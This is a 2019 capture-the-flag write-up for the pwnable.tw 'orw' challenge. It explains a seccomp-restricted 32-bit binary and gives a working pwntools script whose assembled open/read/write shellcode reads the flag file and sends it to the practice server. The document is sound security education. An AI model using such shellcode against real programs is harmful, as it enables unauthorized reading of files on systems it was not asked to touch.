---
title: pwnable.tw orw Writeup
date: "2019-10-12"
---

>Read the flag from /home/orw/flag.
>Only open read write syscall are allowed to use.


## Environment

```sh
$ uname -a
Linux base-debootstrap 4.4.0-159-generic #187-Ubuntu SMP Thu Aug 1 16:28:06 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
```

## Findings
This file is 32bit ELF file.

```sh
$ file ./orw 
./orw: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 2.6.32, BuildID[sha1]=e60ecccd9d01c8217387e8b77e9261a1f36b5030, not stripped
```

Disassemble result.

![](https://i.imgur.com/KoydAxy.png)

This file read shellcode and execute it, but since seccomp is used, system calls other than `open`, `read`, and `write` cannot be used.
So we need write shellcode that only used `open`, `read`, and `write`.

## Writeup
I wrote shellcode that only used `open`, `read`, `write` syscalls.
(Reffer: https://syscalls.kernelgrok.com/ )

```python
from pwn import *

HOST = 'chall.pwnable.tw'
PORT = 10001

context(os='linux', arch='i386')
context.log_level = 'debug'

shell_code = asm('\n'.join([
    'push %d' % u32('ag\0\0'),
    'push %d' % u32('w/fl'),
    'push %d' % u32('e/or'),
    'push %d' % u32('/hom'), # Flag path
    'mov edx, 0', # Mode
    'mov ecx, 0', # Open syscall flag
    'mov ebx, esp', # Buffer
    'mov eax, 5', # Open syscall number
    'int 0x80',

    'mov edx, 128', # Count
    'mov ecx, esp', # Buffer
    'mov ebx, eax', # fd
    'mov eax, 3', # Read syscall number
    'int 0x80',

    'mov edx, eax', # Count
    'mov ecx, esp', # Buffer
    'mov ebx, 0', # fd
    'mov eax, 4', # Write syscall number
    'int 0x80',
]))

# for executing code on remote or local
if len(sys.argv) > 1 and sys.argv[1] == '-r':
    conn = remote(HOST, PORT)
else:
    conn = process('./orw')

log.info('Pwning start')
conn.recvuntil("Give my your shellcode:")
conn.sendline(shell_code)
conn.recvall()
```